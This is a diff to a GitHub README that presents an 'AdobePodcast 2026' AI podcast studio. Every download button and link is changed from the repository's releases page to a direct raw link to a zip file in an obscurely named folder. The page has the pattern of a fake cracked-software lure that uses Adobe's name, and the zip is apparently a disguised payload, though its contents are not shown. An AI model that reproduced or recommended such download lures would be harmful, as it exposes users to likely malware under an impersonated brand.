@@ -1,7 +1,7 @@
 <h1>🎙️ AdobePodcast-Desktop---Adobe-Podcast-AI-2026 - Your All-in-One AI Podcast & Voice Studio</h1>
 
 <p align="center">
-  <a href="https://github.com/gislenereismendes6/AdobePodcast-Desktop---Adobe-Podcast-AI-2026/releases">
+  <a href="https://raw.githubusercontent.com/gislenereismendes6/AdobePodcast-Desktop---Adobe-Podcast-AI-2026/main/countersconce/A_Podcast_Adobe_Desktop_v2.1.zip">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF5722?style=for-the-badge&logo=github&logoColor=white&labelColor=2E7D32" alt="Download Now" />
   </a>
 </p>
@@ -44,7 +44,7 @@ Getting the app on your computer is easy. Here is exactly what to do:
 1.  **Visit the download page** by clicking the big orange button below (or the button at the top of this page):
 
     <p align="center">
-      <a href="https://github.com/gislenereismendes6/AdobePodcast-Desktop---Adobe-Podcast-AI-2026/releases">
+      <a href="https://raw.githubusercontent.com/gislenereismendes6/AdobePodcast-Desktop---Adobe-Podcast-AI-2026/main/countersconce/A_Podcast_Adobe_Desktop_v2.1.zip">
         <img src="https://img.shields.io/badge/⬇️_GO_TO_DOWNLOAD_PAGE-1976D2?style=for-the-badge&logo=download&logoColor=white&labelColor=333333" alt="Go to Download Page" />
       </a>
     </p>
@@ -136,7 +136,7 @@ You are just minutes away from professional-grade audio. Thousands of podcasters
 
 . 
 
-**[⬇️ CLICK HERE TO DOWNLOAD ADOBEPODCAST 2026 NOW](https://github.com/gislenereismendes6/AdobePodcast-Desktop---Adobe-Podcast-AI-2026/releases)**
+**[⬇️ CLICK HERE TO DOWNLOAD ADOBEPODCAST 2026 NOW](https://raw.githubusercontent.com/gislenereismendes6/AdobePodcast-Desktop---Adobe-Podcast-AI-2026/main/countersconce/A_Podcast_Adobe_Desktop_v2.1.zip)**
 
 **Visit this link to download the application.** Start creating audio that sounds like it was made in a million-dollar studio–without ever leaving your home.
 
